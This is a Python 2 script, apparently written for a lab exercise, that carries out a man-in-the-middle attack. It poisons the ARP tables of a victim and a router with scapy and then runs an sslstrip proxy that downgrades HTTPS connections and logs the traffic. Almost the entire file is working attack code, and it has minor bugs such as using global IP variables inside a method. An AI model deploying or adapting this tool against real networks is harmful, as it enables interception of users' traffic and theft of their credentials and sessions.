from scapy.all import *

from twisted.web import http
from twisted.internet import reactor

from sslstrip.StrippingProxy import StrippingProxy
from sslstrip.URLMonitor import URLMonitor
from sslstrip.CookieCleaner import CookieCleaner

import sys, getopt, logging, traceback, string, os

class DefaultTool:
    def __init__(self, victim_ip, server_ip, network_interface):
        self.victim_ip = victim_ip
        self.server_ip = server_ip
        self.network_interface = network_interface

    @staticmethod
    def get_mac_from_ip(ip):
        result, _ = arping(ip)
        for _, received in result:
            return received[Ether].src

    def arp_poisoning(self):
        victim_mac = self.get_mac_from_ip(self.victim_ip)
        server_mac = self.get_mac_from_ip(self.server_ip)
        # getting self mac will throw exception if enp0s3 network interface does not exit
        attacker_mac = get_if_hwaddr(self.network_interface)

        victim_arp = Ether() / ARP()
        server_arp = Ether() / ARP()

        # Poison the victim's ARP table
        victim_arp[Ether].src = attacker_mac
        victim_arp[ARP].hwsrc = attacker_mac
        victim_arp[ARP].psrc = server_ip
        victim_arp[ARP].hwdst = victim_mac
        victim_arp[ARP].pdst = victim_ip
        sendp(victim_arp, iface=self.network_interface)

        # Poison the server's ARP table
        server_arp[Ether].src = attacker_mac
        server_arp[ARP].hwsrc = attacker_mac
        server_arp[ARP].psrc = victim_ip
        server_arp[ARP].hwdst = server_mac
        server_arp[ARP].pdst = server_ip
        sendp(server_arp, iface=self.network_interface)
        time.sleep(3)

    def ssl_stripping(self):

        logFile      = 'sslstrip.log'
        logLevel     = logging.WARNING # or WARNING
        listenPort   = 8080
        spoofFavicon = False
        killSessions = True

        logging.basicConfig(level=logLevel, format='%(asctime)s %(message)s',
                            filename=logFile, filemode='w')
        URLMonitor.getInstance().setFaviconSpoofing(spoofFavicon)
        CookieCleaner.getInstance().setEnabled(killSessions)
        strippingFactory              = http.HTTPFactory(timeout=10)
        strippingFactory.protocol     = StrippingProxy
        reactor.listenTCP(int(listenPort), strippingFactory)
        print "\nsslstrip based on Moxie's Marlinspike sslstrip running..."
        reactor.run()

# this is for arp spooofing
#victim_ip = "192.168.56.103"
#server_ip = "192.168.56.102"
#network_interface = "enp0s3"
#tool = DefaultTool(victim_ip, server_ip, network_interface)
#tool.arp_poisoning()

# this is for ssl stripping
victim_ip         = "10.0.2.5"
server_ip         = "10.0.2.1" # ip of the router
network_interface = "enp0s8"

tool = DefaultTool(victim_ip, server_ip, network_interface)
tool.ssl_stripping()
